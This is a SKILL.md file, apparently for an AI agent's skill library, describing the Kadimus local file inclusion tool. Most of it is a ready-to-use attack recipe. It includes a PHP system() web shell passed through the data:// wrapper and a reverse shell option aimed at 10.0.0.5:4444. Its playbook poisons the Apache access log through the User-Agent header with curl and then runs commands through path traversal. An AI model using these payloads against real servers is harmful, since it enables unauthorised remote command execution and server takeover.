---
name: kadimus-lfi-rce
description: "Kadimus gains shells via log poisoning. Signals: web vulnerability, injection, LFI detection, log poisoning path, self-contained reverse shell."
zh-signals: "Kadimus: 日志污染拿 shell。信号:web漏洞,注入,LFI 检测,日志污染路径,自包含反弹 shell。"
when-to-use: >-
  Use when a web parameter looks vulnerable to local file inclusion and you want
  to detect LFI and weaponize it via log poisoning, data:// or self-contained reverse shell.
---

# Kadimus

- Attack Category: C09 Web Exploitation (LFI)
- Upstream Repository: https://github.com/P0cL4bs/Kadimus
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/P0cL4bs/Kadimus && cd Kadimus && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./kadimus -u 'https://t.com/?page=about'` | LFI detection |
| `-t -u url -D data:// -c '<?php system($_GET[0]);?>'` | data:// wrapper + command execution |
| `--lfi-log /var/log/apache2/access.log` | Log poisoning path |
| `-S 10.0.0.5:4444 -u url -D /proc/self/fd/` | Self-contained reverse shell |
| `--cookie 'PHPSESSID=xxx'` | Scan with a Cookie |
| `-b` | base64 output handling |

## Attack Scenario Playbook

### Log Poisoning to Get a Shell

```bash
curl -A "<?php system(\$_GET['c']);?>" http://t.com/
./kadimus -u 'http://t.com/view.php?file=../../../../var/log/apache2/access.log&c=id' --cmd id
```

## Notes

LFI specialist: four weaponized paths — data://, /proc/self/environ, log poisoning, and php://input.
